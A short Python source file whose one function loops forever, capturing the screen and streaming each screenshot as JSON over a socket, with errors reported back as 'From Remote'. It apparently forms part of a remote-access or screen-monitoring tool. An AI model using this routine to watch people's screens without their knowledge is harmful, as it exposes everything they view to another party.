import pyautogui
import io
import struct
from PIL import ImageGrab
import json

def send_screenshot(client_socket):
    while True:
        try:
            try:
                screenshot = pyautogui.screenshot()
            except OSError:
                screenshot = ImageGrab.grab()

            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            screenshot_data = buffer.getvalue()

            screenshot_json = {
                "screenshot": {
                    "length": len(screenshot_data),
                    "data": screenshot_data.decode("latin1")
                }
            }

            client_socket.sendall(json.dumps(screenshot_json).encode('utf-8'))

        except (ConnectionError, ConnectionResetError):
            pass
        except Exception as e:
            message = f"From Remote: {str(e)}"
            client_socket.sendall(json.dumps({"logger": message}).encode())
